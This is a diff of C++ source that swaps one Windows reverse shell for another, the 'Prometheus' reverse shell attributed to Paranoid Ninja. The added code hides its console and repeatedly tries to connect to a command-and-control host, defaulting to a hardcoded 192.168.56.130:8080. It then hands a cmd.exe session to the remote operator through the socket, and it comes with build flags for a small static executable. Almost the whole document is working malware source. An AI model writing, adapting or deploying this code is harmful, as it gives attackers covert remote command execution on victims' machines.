@@ -2,7 +2,7 @@
 //#include <WinSock2.h>
 //#include <process.h>
 //#pragma comment(lib, "ws2_32.lib")
-//#define ip "192.168.28.1"
+//#define ip "127.0.0.1"
 //#define port 1234
 //HANDLE g_hChildStd_IN_Rd = NULL;
 //HANDLE g_hChildStd_IN_Wr = NULL;
@@ -10,6 +10,8 @@
 //HANDLE g_hChildStd_OUT_Wr = NULL;
 //HANDLE hThread;
 //HANDLE hThrecv;
+//PROCESS_INFORMATION pi;
+//STARTUPINFO si;
 //HANDLE hThsend;
 //using namespace std;
 //
@@ -17,28 +19,40 @@
 //{
 //	SOCKET* x = reinterpret_cast<SOCKET*> (pArgument);
 //	DWORD recv_size = 0;
-//	char buf[4096];
-//	ZeroMemory(buf, sizeof(buf));
-//	while (recv_size = recv(*x, buf, 4096, 0) != SOCKET_ERROR)
-//	{
-//		WriteFile(g_hChildStd_IN_Wr, buf, recv_size, NULL, NULL);
-//		ZeroMemory(buf, sizeof(buf));
-//	}
-//	return 1;
-//}
-//unsigned __stdcall sendThread(void* pArgument)
-//{
-//	SOCKET* x = reinterpret_cast<SOCKET*> (pArgument);
-//	DWORD dwRead = 0;
+//	bool bsuccess = false;
 //	char buf[4096];
 //	ZeroMemory(buf, sizeof(buf));
 //	while (1)
 //	{
-//		if (!ReadFile(g_hChildStd_OUT_Rd, buf, 4096, &dwRead, 0) || dwRead == 0)
-//			continue;
-//		cout << buf << endl;
-//		int a = send(*x, buf, dwRead+1, 0);
-//		int b = 2;
+//		ZeroMemory(buf, sizeof(buf));
+//		recv_size = recv(*x, buf, 4096, 0);
+//		if (recv_size <= 0)
+//		{
+//			bsuccess = WriteFile(g_hChildStd_IN_Wr, "exit\n", 5, NULL, 0);
+//		}
+//		bsuccess = WriteFile(g_hChildStd_IN_Wr, buf, recv_size, NULL, 0);
+//		if (!bsuccess)
+//			return 1 ;
+//	}
+//}
+//unsigned __stdcall sendThread(void* pArgument)
+//{
+//	SOCKET* x = reinterpret_cast<SOCKET*> (pArgument);
+//	DWORD dwRead = 0, nsend = 0;
+//	char buf[4096];
+//	bool bsuccess = false;
+//	while (1)
+//	{
+//		ZeroMemory(buf, sizeof(buf));
+//		bsuccess = ReadFile(g_hChildStd_OUT_Rd, buf, 4095, &dwRead, 0);
+//		if (!bsuccess || dwRead <= 0)
+//			break;
+//		nsend = send(*x, buf, strlen(buf), 0);
+//		if (nsend <= 0)
+//		{
+//			TerminateProcess(pi.hProcess, 0);
+//			break;
+//		}
 //	}
 //	return 1;
 //}
@@ -81,9 +95,7 @@
 //			return 1;
 //		if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
 //			return 1;
-//		PROCESS_INFORMATION pi;
 //		ZeroMemory(&pi, sizeof(pi));
-//		STARTUPINFO si;
 //		ZeroMemory(&si, sizeof(si));
 //		si.cb = sizeof(si);
 //		si.hStdError = g_hChildStd_OUT_Wr;
@@ -105,47 +117,93 @@
 //		CloseHandle(pi.hThread);
 //		CloseHandle(g_hChildStd_OUT_Wr);
 //		CloseHandle(g_hChildStd_IN_Rd);
-//		
-//		
 //	}
 //	return 0;
 //}
+//Author : Paranoid Ninja
+//Email  : paranoidninja@protonmail.com
+//Blog   : https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
+
+//Compile with g++/i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+//The effective size with statically compiled code should be around 13 Kb
+
+
 #include <winsock2.h>
-#include <stdio.h>
-//#define _CRT_SECURE_NO_WARNINGS
-#pragma comment(lib, "ws2_32")
-
-WSADATA wsaData;
-SOCKET Winsock;
-SOCKET Sock;
-struct sockaddr_in hax;
-char ip_addr[16];
-STARTUPINFO ini_processo;
-PROCESS_INFORMATION processo_info;
+#include <windows.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
+#define DEFAULT_BUFLEN 1024
 
 
-int main(int argc, char* argv[])
-{
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
-    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+void RunShell(char* C2Server, int C2Port) {
+    while (true) {
+        Sleep(5000);    // 1000 = One Second
 
-    if (argc != 3) { fprintf(stderr, "Uso: <rhost> <rport>\n"); exit(1); }
-    struct hostent* host;
-    host = gethostbyname(argv[1]);
-    strcpy(ip_addr, inet_ntoa(*((struct in_addr*)host->h_addr)));
+        SOCKET mySocket;
+        sockaddr_in addr;
+        WSADATA version;
+        WSAStartup(MAKEWORD(2, 2), &version);
+        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+        addr.sin_family = AF_INET;
 
-    hax.sin_family = AF_INET;
-    hax.sin_port = htons(atoi(argv[2]));
-    hax.sin_addr.s_addr = inet_addr(ip_addr);
+        addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
+        addr.sin_port = htons(C2Port);     //Port received from main function
 
-    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+        //Connecting to Proxy/ProxyIP/C2Host
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+            closesocket(mySocket);
+            WSACleanup();
+            continue;
+        }
+        else {
+            char RecvData[DEFAULT_BUFLEN];
+            memset(RecvData, 0, sizeof(RecvData));
+            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+            if (RecvCode <= 0) {
+                closesocket(mySocket);
+                WSACleanup();
+                continue;
+            }
+            else {
+                TCHAR Process[] = L"cmd.exe";
+                STARTUPINFO sinfo;
+                PROCESS_INFORMATION pinfo;
+                memset(&sinfo, 0, sizeof(sinfo));
+                sinfo.cb = sizeof(sinfo);
+                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
+                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+                WaitForSingleObject(pinfo.hProcess, INFINITE);
+                CloseHandle(pinfo.hProcess);
+                CloseHandle(pinfo.hThread);
 
-    memset(&ini_processo, 0, sizeof(ini_processo));
-    ini_processo.cb = sizeof(ini_processo);
-    ini_processo.dwFlags = STARTF_USESTDHANDLES;
-    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
-    LPWSTR cmtArg = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe"));
-    CreateProcess(NULL, cmtArg, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
-    WaitForSingleObject(processo_info.hProcess,INFINITE);
+                memset(RecvData, 0, sizeof(RecvData));
+                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+                if (RecvCode <= 0) {
+                    closesocket(mySocket);
+                    WSACleanup();
+                    continue;
+                }
+                if (strcmp(RecvData, "exit\n") == 0) {
+                    exit(0);
+                }
+            }
+        }
+    }
+}
+//-----------------------------------------------------------
+//-----------------------------------------------------------
+//-----------------------------------------------------------
+int main(int argc, char** argv) {
+    FreeConsole();
+    if (argc == 3) {
+        int port = atoi(argv[2]); //Converting port in Char datatype to Integer format
+        RunShell(argv[1], port);
+    }
+    else {
+        char host[] = "192.168.56.130";
+        int port = 8080;
+        RunShell(host, port);
+    }
     return 0;
 }
